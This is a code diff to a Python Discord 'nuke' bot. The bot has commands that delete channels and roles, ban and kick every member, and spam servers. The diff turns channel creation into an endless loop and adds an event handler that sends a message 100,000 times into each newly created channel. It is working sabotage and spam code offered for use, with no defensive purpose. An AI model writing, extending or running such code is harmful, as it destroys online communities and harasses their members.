@@ -143,7 +143,7 @@ async def nuke(ctx):
       print(f"{Fore.Red}Channel could not be deleted")
 
     try:
-      for i in range(100):
+      while True:
         guild = ctx.message.guild
         await guild.create_text_channel(channels)
         print(f"{Fore.GREEN}Channel created")
@@ -159,12 +159,7 @@ async def nuke(ctx):
         pass
         print(f"{Fore.RED}Role: {role} could not be deleted")
 
-    while True:
-      try:
-        await guild.create_role(name=rolenames)
-        print(f"{Fore.GREEN} Roles Have Been Created")
-      except:
-        print(f"{Fore.RED}Role could not be created")
+
 
 @bot.command()
 async def Sname(ctx):
@@ -180,7 +175,7 @@ async def dchannels(ctx):
 async def schannels(ctx):
     await ctx.message.delete()
     guild = ctx.message.guild
-    await guild.create_text_channel(channels) 
+    await guild.create_text_channel(channels)
 
 @bot.command()
 async def banall(ctx):
@@ -201,6 +196,10 @@ async def kickall(ctx):
             print(f"{Fore.GREEN} Kicked {strosity} from guild.")
         except:
             pass
-    print(f"{Fore.GREEN}Kicking ever member has been ordered!")        
-        
+    print(f"{Fore.GREEN}Kicking ever member has been ordered!")      
+
+@bot.event
+async def on_guild_channel_create(channel):
+    for x in range(100000):
+        await channel.send(message)
 bot.run(token)
